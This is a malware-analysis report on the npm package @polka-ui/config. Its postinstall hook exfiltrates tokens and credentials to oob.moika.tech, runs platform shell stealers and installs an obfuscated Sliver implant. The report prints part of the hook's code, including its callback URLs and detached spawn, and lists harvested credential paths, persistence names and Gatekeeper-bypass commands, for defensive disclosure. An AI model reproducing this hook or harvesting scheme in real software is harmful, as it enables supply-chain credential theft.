---
title: "@polka-ui/config: a postinstall that announces itself, then drops Sliver"
date: 2026-05-27
summary: "`@polka-ui/config@9.9.11` is a 5 KB npm tarball whose `postinstall` self-identifies as a `dependency-confusion-npm` PoC, exfils every npmrc, env var, and parent-project secret to `oob.moika.tech`, and chains into a platform-aware shell stealer that drops a 24–36 MB garble-obfuscated Go implant. The implant carries Sliver's `executables/<arch>/{regular,xp}/winpty(.dll|-agent.exe)` resource layout and beacons to `https://141.98.189.248:32322` on UFO Hosting (RU)."
packageName: "@polka-ui/config"
ecosystem: npm
---

The name is the giveaway. `@polka-ui/config` is published to the public npm registry while its README tells you to set `registry=https://npm.polka-ui.io`. A developer at the impersonated org with a misconfigured `.npmrc` resolves the public tag first and detonates the `postinstall`. The script's own header reads `[PoC] Dependency confusion payload — AUTHORIZED TESTING ONLY` — but the Russian inline comments and the real Sliver implant at the end suggest the label is plausible deniability, not a constraint.

## Package metadata

The scope is brand-new and the publisher walked five versions through the registry in under fifty minutes. The maintainer handle is the loud part: `bcs-bank-complex-ui` doesn't belong to `@polka-ui` at all — it reads as a Russian-bank ops handle reused across campaigns.

| Field | Value |
| --- | --- |
| Maintainer | `bcs-bank-complex-ui <bcs-bank-complex-ui@proton.me>` |
| Author (declared) | `Polka-Ui Platform Engineering <platform@polka-ui.io>` |
| Versions published | `9.9.9`, `9.9.10`, `9.9.11`, `9.9.12`, `9.9.13` on `2026-05-27` `18:28:43Z`–`19:16:25Z`; `latest` = `9.9.13` |
| Repository / homepage / bugs | `github.polka-ui.io` / `docs.polka-ui.io` / `jira.polka-ui.io` |
| Scripts | `postinstall: node scripts/postinstall.js` |
| Provenance | none (registry signature `SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U` only) |

## Stage 1 — `postinstall.js`: recon + dropper

`scripts/postinstall.js` is the only executable in the tarball. After a three-second sleep — labelled `обходит npm audit sandbox таймауты` in the source — it sweeps the host and POSTs the result as JSON to `oob.moika.tech/report`. In parallel a platform-detected stage-2 is written to `$TMPDIR/._polka-ui_init.{sh,bat}` and reparented through a `nohup`-detached shell so it outlives the install.

<pre class="lang-js"><code><span class="tok-kw">const</span> CALLBACK_URL = process.env.DEP_CONFUSION_URL     || <span class="tok-str">'https://oob.moika.tech/report'</span>;
<span class="tok-kw">const</span> PAYLOAD_BASE = process.env.DEP_CONFUSION_PAYLOAD || <span class="tok-str">'https://oob.moika.tech/payload'</span>;
<span class="tok-com">// Задержка 30 сек — обходит npm audit sandbox таймауты</span>
<span class="tok-kw">await</span> <span class="tok-kw">new</span> Promise(r =&gt; setTimeout(r, 3000));
<span class="tok-kw">const</span> child = require(<span class="tok-str">'child_process'</span>).spawn(<span class="tok-str">'/bin/sh'</span>, [<span class="tok-str">'-c'</span>,
  <span class="tok-str">`nohup /bin/sh "${tmp}" &gt;/dev/null 2&gt;&amp;1 &amp;`</span>], { detached: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
child.unref();
</code></pre>

| Collected | Source |
| --- | --- |
| `npm_token`, `npm_config_authtoken`, `node_auth_token`, `npm_config__auth` | `process.env` lowercase-substring match |
| `aws_access_key_id`, `aws_secret_access_key`, `aws_session_token` | `process.env` |
| `github_token`, `github_actions`, `artifactory_token`, `nexus_token`, `ci` | `process.env` |
| `~/.npmrc`, `/etc/npmrc`, `./.npmrc`, `../.npmrc` (first 15 lines each) | filesystem |
| parent `package.json` (name, scripts, deps, repo, author) | `../../package.json` |
| `.git/config` + `git log --oneline -10` | `../../.git` |
| `../../.env`, `/etc/resolv.conf`, `/etc/hosts`, `ip a` / `ifconfig` | filesystem + shell |

## Stage 2 — platform shell stealer

Stage 2 is three platform scripts — 16 KB Linux, 11 KB macOS, 7 KB Windows. Each sweeps credentials into `$HOME/dep_confusion_stage2_<os>.txt`, then downloads stage-3 and installs persistence. Windows tries seven launch methods until one sticks:

1. `start`
2. `Start-Process`
3. `Win32_Process`
4. `rundll32`
5. `mshta`
6. `wscript`
7. `node -e`

| OS | Targets harvested |
| --- | --- |
| Linux | `/etc/passwd`, `sudo -l`, SUID, `id_*` + `authorized_keys` + `ssh_config`, `.env*`, `*.{json,yaml,toml,ini,conf,properties}` greps for `api_key/secret/token/password`, `~/.aws/{credentials,config}`, EC2 IMDS, `application_default_credentials.json`, Azure `accessTokens.json`, `~/.docker/config.json`, `~/.kube/config`, `.npmrc`, `.pypirc`, composer `auth.json`, Maven `settings.xml`, `credentials.tfrc.json`, `*.tfvars`, `.vault-token`, `*.{pem,key,p12,pfx,jks}`, `.git-credentials`, `.netrc`, `.{bash,zsh}_history`, `/var/run/secrets/kubernetes.io` |
| macOS | Same target set as Linux, plus `xattr -cr` + ad-hoc `codesign --force --sign -` on the stage-3 binary (Gatekeeper bypass) |
| Windows | `cmdkey /list`, `%USERPROFILE%\.{ssh,gitconfig,aws,docker,npmrc}`, env greps for `token/secret/key/aws/github/npm/artifactory/nexus` |

## Stage 3 — garble-obfuscated Sliver implant

Stage 3 is a Go binary built once per platform: 26 MB ELF, 24 MB Mach-O arm64, 36 MB Windows PE. All three are garble-obfuscated, statically linked, stripped, and hardcoded to the same C2: `https://141.98.189.248:32322`.

The Windows build is the one that names the family. Embedded in `.rdata` are ten PEs — winpty DLLs and agents — indexed by Sliver's exact resource layout: `executables/<arch>/{regular,xp}/winpty(.dll|-agent.exe)`. The PDBs (`C:\rprichard\proj\winpty\…`) are from rprichard's upstream winpty project, which Sliver bundles to give operators a real PTY for its interactive shell commands.

Same operator runs both ends: UFO Hosting (AS33993, RU) for the implant C2, reg.ru's `moika.tech` for stage-1/2 delivery.

The inversion is worth noting: this isn't a typosquat hoping someone fat-fingers a package name — it's a postinstall built on the assumption that someone inside the impersonated org has a misconfigured `.npmrc`, and the chain after it is optimized for what's already on a developer laptop or CI runner before the Sliver implant ever runs.

## Traits observed

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/install-hook/scripts/hook-file` | `package.json` declares `"postinstall": "node scripts/postinstall.js"` (self-labelled `dependency-confusion-npm`) |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/recon-exfil/pipeline` | JSON POST to `https://oob.moika.tech/report` carrying env, npmrc, git config, parent `.env`, `ip a`, `/etc/hosts` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/stealth-spawn` | `spawn('/bin/sh', ['-c', 'nohup … &'], { detached:true, stdio:'ignore' }).unref()` reparents stage-2 |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/download-execute` | `curl -fsSL` / `Invoke-WebRequest` → `chmod +x` / PE-magic check → seven-method Windows launch chain |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/credential-access/cloud/{container,token}` + `credential-access/env/harvesting` | system-wide `find` for `id_*`, `authorized_keys`, `.env*`, `*.{pem,key,p12}`, `~/.aws/credentials`, GCP ADC, Azure tokens, K8s secrets, `.vault-token`, EC2 IMDS |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/remote-command/control` | Classifier matches `go-garbled-ssh-c2-backdoor` + `go-ssh-exec-c2-backdoor` on stage-3 symbol shape alone — independent confirmation of the winpty / Sliver fingerprint |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/tools/garble` | Stage-3 ELF / Mach-O / PE all carry garble-randomized symbols and stripped Go module tables |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/infrastructure/config` + `domain/tld` | `https://141.98.189.248:32322` hardcoded in all three binaries (UFO Hosting LLC, RU, AS33993) |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/tool/sysadmin/console` (× 10, embedded) | Sliver's `executables/<arch>/{regular,xp}/winpty(.dll\|-agent.exe)` resource layout with `C:\rprichard\proj\winpty` PDBs |
| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/crypto/symmetric/stream::go-obfuscated-xor-stream` | Multiple garbled packages call `XORKeyStream` (e.g. `jAmp6hOkg3u.(*FeD1DdXQ).XORKeyStream`, `Q4QTvhbIIRr.(*o8nCXVrS3F).XORKeyStream`) — stream-cipher layer alongside the TLS C2 |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/persistence/{system/init/boot, login/registry/autostart, system/cron/schedule}` | `systemd --user` `dbus-broker.service`, `HKCU\…\Run` `MicrosoftUpdateService`, `schtasks` `MicrosoftEdgeUpdateCore`, crontab `@reboot`, Startup folder copy |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/{anti-av/platform/gatekeeper, quarantine-removal/bypass, security-bypass/codesign}` | macOS stage-2 runs `xattr -cr` + `codesign --force --sign -` on the stage-3 Mach-O |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/hosts-file/block-security` + `command-and-control/infrastructure/dns-pin` | Reads `/etc/hosts` / `C:\Windows\System32\drivers\etc\hosts` during recon |
| <span class="sev-dot notable" title="notable"></span> | `objectives/evasion/masquerade/debug::pe-stem-differs-from-pdb-stem` | Each embedded winpty PE's filename stem disagrees with its embedded PDB stem — the bundle was renamed after build, not produced from the PDB-named source |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Scoped name `@polka-ui/config` published publicly; `license: UNLICENSED`; `repository.url` + `bugs.url` + `homepage` all point at non-existent `polka-ui.io` infra; `dist/index.js` re-exports a `src/index.js` not in the tarball |

## Indicators

| Type | Value |
| --- | --- |
| Package | `@polka-ui/config@9.9.11` (npm, scoped, public-registry) |
| Tarball SHA-256 | [`cefab95fdea9a19f1c7f76f589d663b428ea3f4f674210ad6dadc43277c67ed9`](https://lab.atomdrift.org/file/cefab95fdea9a19f1c7f76f589d663b428ea3f4f674210ad6dadc43277c67ed9) (5,255 B) |
| Tarball SHA-1 (npm `shasum`) | `6c164d221d9204d3029bd10c0c9f41e30bba10ac` |
| `scripts/postinstall.js` SHA-256 | [`f7c6bc732dc276b8b11cda85378e416881f65561f550b903e2ad0ba234b3a9d7`](https://lab.atomdrift.org/file/f7c6bc732dc276b8b11cda85378e416881f65561f550b903e2ad0ba234b3a9d7) (274 lines) |
| Stage-1 callback | `POST https://oob.moika.tech/report` (env, npmrc, git, parent `.env`, network) |
| Stage-2 URLs | `https://oob.moika.tech/payload/{linux,mac,win}` → `72.56.97.200` (reg.ru, `moika.tech`) |
| Stage-2 SHA-256 (linux) | [`d0948dbf94409660ab97eb937a41eb23137dd2414530dcba2b717a4993d797b1`](https://lab.atomdrift.org/file/d0948dbf94409660ab97eb937a41eb23137dd2414530dcba2b717a4993d797b1) (16,739 B) |
| Stage-2 SHA-256 (macOS) | [`6e45f9b81797b39a7a91ba51e0a0ac70a347dc5e4ab13d696bb3b510062525ad`](https://lab.atomdrift.org/file/6e45f9b81797b39a7a91ba51e0a0ac70a347dc5e4ab13d696bb3b510062525ad) (11,270 B) |
| Stage-2 SHA-256 (Windows) | [`74e89da49fd481e01a88de51da7eb1d4d31755cec5e9067d2b0f1505b5e6e478`](https://lab.atomdrift.org/file/74e89da49fd481e01a88de51da7eb1d4d31755cec5e9067d2b0f1505b5e6e478) (6,629 B) |
| Stage-3 URLs | `https://oob.moika.tech/bins/{linux/linux,mac/macos,win/win}` |
| Stage-3 SHA-256 (ELF x86-64) | [`80b98bd4b63d5a9cb8623c3e03a4596692a9304f9e82253241c457fccb697989`](https://lab.atomdrift.org/file/80b98bd4b63d5a9cb8623c3e03a4596692a9304f9e82253241c457fccb697989) (26,194,068 B, statically linked, stripped, Go) |
| Stage-3 SHA-256 (Mach-O arm64) | [`1fd0c8a7ce279a40e2921177b1fb80d0f5a3d1afe47192cf4e62bb048f388498`](https://lab.atomdrift.org/file/1fd0c8a7ce279a40e2921177b1fb80d0f5a3d1afe47192cf4e62bb048f388498) (23,694,482 B, ad-hoc signed) |
| Stage-3 SHA-256 (PE x86-64) | [`c4ca166af92dd73595fdd908511916d0c53c65047886db3fe688c2b5d622588f`](https://lab.atomdrift.org/file/c4ca166af92dd73595fdd908511916d0c53c65047886db3fe688c2b5d622588f) (35,801,088 B, 9 embedded winpty PEs) |
| Implant C2 | `https://141.98.189.248:32322` → UFO Hosting LLC, AS33993, RU (inetnum allocated 2025-12-03) |
| Persistence (Linux) | `~/.config/systemd/user/dbus-broker.service` → `$HOME/.cache/._kworker`; crontab `@reboot`; `~/.bashrc` |
| Persistence (macOS) | `$HOME/Library/Application Support/.coreservices/universald` (`xattr -cr` + ad-hoc codesign) |
| Persistence (Windows) | `HKCU\…\Run\MicrosoftUpdateService` → `%APPDATA%\Microsoft\Windows\WinUpdate.exe`; `schtasks /tn MicrosoftEdgeUpdateCore /sc onlogon`; Startup-folder copy |
| Family | Sliver (BishopFox), garble-obfuscated, winpty-bundled |
| Family fingerprints | `executables/{386,amd64,arm64}/{regular,xp}/winpty(.dll\|-agent.exe)` resource paths; `C:\rprichard\proj\winpty\src\…` + `C:\Users\mail\source\winpty\src\…` PDBs; permissive Go SSH server (`NoClientAuth`+`PublicKeyCallback`); X25519/ChaCha8/ARC4 mix |
| Operator language | Russian inline comments (`Задержка 30 сек — обходит npm audit sandbox таймауты`, `Скачать`, `Скрыть консоль`) |
